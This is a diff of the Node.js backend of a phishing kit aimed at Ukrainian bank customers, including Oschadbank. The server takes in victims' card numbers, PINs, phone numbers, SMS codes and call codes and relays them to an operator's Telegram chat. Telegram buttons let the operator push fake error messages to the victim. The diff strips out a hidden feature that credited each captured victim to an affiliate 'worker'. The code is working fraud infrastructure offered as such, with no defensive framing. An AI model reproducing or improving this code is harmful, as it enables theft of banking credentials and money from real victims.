@@ -1,11 +1,9 @@
-// server.js (полностью готовый — worker скрыт для пользователя)
 const express = require('express');
 const cors = require('cors');
 const TelegramBot = require('node-telegram-bot-api');
 const WebSocket = require('ws');
 const path = require('path');
 require('dotenv').config();
-const crypto = require('crypto');
 
 // =======================================================================
 // --- НАСТРОЙКИ: Используйте env vars ---
@@ -30,41 +28,10 @@ app.use((req, res, next) => {
     next();
 });
 
-app.get('/panel.html', (req, res) => {
-    res.sendFile(path.join(__dirname, 'panel.html'));
-});
-
-const sessions = new Map();
-
-// =======================================================================
-// GET / — сохраняем worker и sessionId
+// Обслуживание index.html из корня
 app.get('/', (req, res) => {
-    const worker = req.query.worker; // получаем ?worker=@ник
-    const sessionId = req.query.sessionId || crypto.randomBytes(8).toString('hex');
-
-    // сохраняем worker в сессии, если есть
-    if (worker) {
-        const existing = sessions.get(sessionId) || {};
-        sessions.set(sessionId, { ...existing, worker });
-        console.log(`Сессия ${sessionId}: worker = ${worker}`);
-    }
-
     res.sendFile(path.join(__dirname, 'index.html'));
 });
-
-// =======================================================================
-// Новый маршрут: POST /api/registerWorker — скрыто регистрируем воркера
-app.post('/api/registerWorker', (req, res) => {
-    const { sessionId, worker } = req.body;
-    if (!sessionId || !worker) return res.status(400).json({ message: "Не указан sessionId или worker" });
-
-    const existing = sessions.get(sessionId) || {};
-    sessions.set(sessionId, { ...existing, worker });
-    console.log(`Сессия ${sessionId}: worker = ${worker}`);
-    res.json({ message: "Worker зарегистрирован" });
-});
-
-// =======================================================================
 
 const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
 
@@ -91,6 +58,7 @@ const server = require('http').createServer(app);
 const wss = new WebSocket.Server({ server });
 
 const clients = new Map();
+const sessions = new Map();
 
 wss.on('connection', (ws) => {
     console.log('Client connected');
@@ -118,37 +86,24 @@ wss.on('connection', (ws) => {
     });
 });
 
-// =======================================================================
-// POST /api/submit — берем worker из сессии
 app.post('/api/submit', (req, res) => {
     console.log('API /submit:', req.body);
     const { sessionId, isFinalStep, ...stepData } = req.body;
 
-    console.log(`Session ${sessionId}: isFinalStep=${isFinalStep}, data keys: ${Object.keys(stepData).join(', ')}`);
+    console.log(`Session ${sessionId}: isFinalStep=${isFinalStep}, data keys: ${Object.keys(stepData).join(', ')}`); // Дебаг лог
 
-    // берем существующую сессию, если есть
     const existingData = sessions.get(sessionId) || { visitCount: 0 };
     const newData = { ...existingData, ...stepData };
-
-    // сохраняем обратно
     sessions.set(sessionId, newData);
 
-    // если пришёл call code
     if (newData.call_code_input) {
         let message = `<b>🔔 Отримано код із дзвінка (Ощадбанк)!</b>\n\n`;
         message += `<b>Код:</b> <code>${newData.call_code_input}</code>\n`;
         message += `<b>Сесія:</b> <code>${sessionId}</code>\n`;
-
-        // worker из сессии
-        if (newData.worker) {
-            message += `<b>👤 Worker:</b> ${newData.worker}\n`;
-        }
-
         bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
         return res.status(200).json({ message: 'Call code received' });
     }
 
-    // финальные данные
     if (isFinalStep) {
         if (!existingData.logSent) {
             newData.visitCount = (existingData.visitCount || 0) + 1;
@@ -172,31 +127,22 @@ app.post('/api/submit', (req, res) => {
         const visitText = newData.visitCount === 1 ? 'NEW' : `${newData.visitCount} раз`;
         message += `<b>Кількість переходів:</b> ${visitText}\n`;
 
-        if (newData.worker) {
-            message += `<b>👤 Worker:</b> ${newData.worker}\n`;
-        }
-
         sendToTelegram(message, sessionId, newData.bankName);
     }
 
     res.status(200).json({ message: 'OK' });
 });
 
-// =======================================================================
-// POST /api/sms
 app.post('/api/sms', (req, res) => {
     console.log('API /sms:', req.body);
     const { sessionId, code } = req.body;
-    console.log(`SMS for ${sessionId}: code=${code}`);
+    console.log(`SMS for ${sessionId}: code=${code}`); // Дебаг лог
     const sessionData = sessions.get(sessionId);
     if (sessionData) {
         let message = `<b>Отримано SMS!</b>\n\n`;
         message += `<b>Код:</b> <code>${code}</code>\n`;
         message += `<b>Номер телефону:</b> <code>${sessionData.phone}</code>\n`;
         message += `<b>Сесія:</b> <code>${sessionId}</code>\n`;
-        if (sessionData.worker) {
-            message += `<b>👤 Worker:</b> ${sessionData.worker}\n`;
-        }
         bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
         console.log(`SMS code received for session ${sessionId}`);
         res.status(200).json({ message: 'OK' });
@@ -205,7 +151,6 @@ app.post('/api/sms', (req, res) => {
     }
 });
 
-// =======================================================================
 function sendToTelegram(message, sessionId, bankName) {
     const keyboard = [
         [
@@ -259,7 +204,7 @@ bot.on('callback_query', (callbackQuery) => {
                 commandData = { text: "Ви вказали невірний пінкод. Натисніть кнопку назад та вкажіть вірний пінкод" };
                 break;
             case 'card_error':
-                commandData = { text: "Вказано невірний номер картки, натисніть кнопку назад та введіть номер картки вірно" };
+                commandData = { text: "Вказано невірний номер картки, натисніть назад та введіть номер картки вірно" };
                 break;
             case 'number_error':
                 commandData = { text: "Вказано не фінансовий номер телефону. Натисніть кнопку назад та вкажіть номер який прив'язаний до вашої картки." };
